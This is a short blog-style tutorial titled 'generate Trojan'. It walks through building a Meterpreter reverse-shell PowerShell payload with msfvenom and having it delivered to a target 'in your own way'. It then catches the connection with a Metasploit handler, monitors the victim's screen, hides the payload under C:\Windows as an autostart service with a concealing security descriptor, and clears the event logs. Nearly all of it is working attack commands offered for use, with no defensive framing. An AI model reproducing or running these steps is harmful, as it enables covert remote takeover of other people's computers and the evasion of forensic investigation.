---
title: "generate Trojan"
date: 2026-04-07
categories: [未分类]
slug: generate-trojan
wordpress_id: 57
---

## windows command

dir:directory cd:change directory cls:clears 

## First 1

into the desktop in the command  

`cd Desktop`

then generate Trojan(LHOST is your computer IP that can ipconfig at command to see,Lport is 1023~65535) 
    
    
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.17.134 LPORT=6688 -f psh-reflection > 1.ps1 [![](/images/2026/04/16-150x150.png)](</images/2026/04/16.png>)

         

## first 2

injure 1.psl into target computer in your own way [![](/images/2026/04/18-150x150.png)](</images/2026/04/18.png>)  

## 

## 

## 

## first 3

run msf 
    
    
    use exploit/multi/handler 
    set PAYLOAD windows/x64/meterpreter/reverse_tcp

[![](/images/2026/04/17-150x150.png)](</images/2026/04/17.png>)            
    
    
    options

discover need set IP(your IP not target) and PORT(ditto) [![](/images/2026/04/20-150x150.png)](</images/2026/04/20.png>)          
    
    
    set lport 6688
    
    
    set lhost 192.168.17.134
    
    
    run

[![](/images/2026/04/21-150x150.png)](</images/2026/04/21.png>)             good you can do whatever on wants on the target computer 

## MSF command

[msfconsole命令大全，以及使用说明 - 代码先锋网](<https://www.codeleading.com/article/68476344123/>) https://www.codeleading.com/article/68476344123/ eg [![](/images/2026/04/22-150x150.png)](</images/2026/04/22.png>)                 [![](/images/2026/04/23-150x150.png)](</images/2026/04/23.png>)            

`screenshar`

real-time monitoring [![](/images/2026/04/24-150x150.png)](</images/2026/04/24.png>)           shell msg */time:0 hello exit 

## First 4

To Trojan hide in C drive 
    
    
    mv 1.ps1 C:/Windows/1.ps1

disguise and config autostart 
    
    
    shell
    
    
    sc create shell start= auto binPath= "cmd.exe /k powershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File C:\Windows\1.ps1" obj= Localsystem
    
    
    sc description "shell" "hello world"
    
    
    sc config "shell" start= auto

[![](/images/2026/04/27-150x150.png)](</images/2026/04/27.png>)           [![](/images/2026/04/26-150x150.png)](</images/2026/04/26.png>)           [![](/images/2026/04/25-150x150.png)](</images/2026/04/25.png>)           hide shell 
    
    
    sc sdset shell "D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"

[![](/images/2026/04/28-150x150.png)](</images/2026/04/28.png>)           [![](/images/2026/04/29-150x150.png)](</images/2026/04/29.png>)        

## The last step

clear log 
    
    
    clearev

  [![](/images/2026/04/30-150x150.png)](</images/2026/04/30.png>)         [![](/images/2026/04/31-150x150.png)](</images/2026/04/31.png>)           then want to find it only use network tracking
